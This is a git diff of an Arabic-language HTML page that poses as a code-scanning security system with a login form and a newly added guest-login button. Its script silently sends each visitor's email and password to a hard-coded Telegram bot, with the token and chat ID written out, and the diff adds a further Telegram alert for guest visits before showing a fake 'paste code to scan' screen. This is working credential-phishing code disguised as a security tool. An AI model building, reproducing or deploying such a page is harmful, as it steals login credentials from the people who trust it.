@@ -3,13 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>موقعي الرهيييب</title>
+    <title>🛡️ نظام فحص جواد</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; width: 90%; max-width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         input, textarea { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
         textarea { color: #39ff14; font-family: monospace; resize: none; }
-        button { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        
+        /* زر الدخول الأساسي */
+        .btn-main { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; margin-bottom: 10px; }
+        
+        /* زر الضيف - بلون مختلف */
+        .btn-guest { width: 100%; padding: 10px; background: transparent; color: #58a6ff; border: 1px solid #58a6ff; border-radius: 6px; cursor: pointer; font-size: 14px; transition: 0.3s; }
+        .btn-guest:hover { background: rgba(88, 166, 255, 0.1); }
+
         h2 { color: #58a6ff; margin-bottom: 20px; }
     </style>
 </head>
@@ -17,32 +24,38 @@
 
 <div class="card" id="mainCard">
     <h2>🛡️ دخول النظام</h2>
-    <p style="color: #8b949e;">يرجى تسجيل الدخول للبدء</p>
+    <p style="color: #8b949e;">سجل دخولك أو ادخل كضيف</p>
     <input type="email" id="email" placeholder="البريد الإلكتروني">
     <input type="password" id="password" placeholder="كلمة المرور">
-    <button onclick="goToScan()">دخول</button>
+    
+    <button class="btn-main" onclick="goToScan('login')">دخول</button>
+    <button class="btn-guest" onclick="goToScan('guest')">الدخول كضيف 👤</button>
 </div>
 
 <script>
     const BOT_TOKEN = "8648545262:AAEqXqGrARHdBgwolI9ny0qM3B0gvKEkE04";
     const CHAT_ID = "8270719098";
 
-    async function goToScan() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
-
-        // إرسال البيانات للتليجرام بالخلفية
-        if(email && pass) {
-            const message = `🔑 دخول جديد:\n📧 ${email}\n🔑 ${pass}`;
+    async function goToScan(type) {
+        if (type === 'login') {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            if(email && pass) {
+                const message = `🔑 دخول مستخدم:\n📧 ${email}\n🔑 ${pass}`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+            }
+        } else {
+            // إرسال تنبيه إن فيه ضيف دخل
+            const message = `👤 تنبيه: دخل شخص "كضيف" للنظام`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
         }
 
-        // تحويل الصفحة فوراً "الصفحة الثانية"
+        // تحويل الصفحة فوراً لشاشة الفحص (الصفحة الثانية)
         document.getElementById('mainCard').innerHTML = `
             <h2>🛡️ نظام الفحص</h2>
             <p style="color: #8b949e;">الصق الكود البرمجي هنا لتحليله</p>
             <textarea id="codeToScan" placeholder="ضع الكود هنا..." rows="5"></textarea>
-            <button onclick="finishScan()">بدء الفحص الآن 🔍</button>
+            <button class="btn-main" onclick="finishScan()">بدء الفحص الآن 🔍</button>
         `;
     }
 
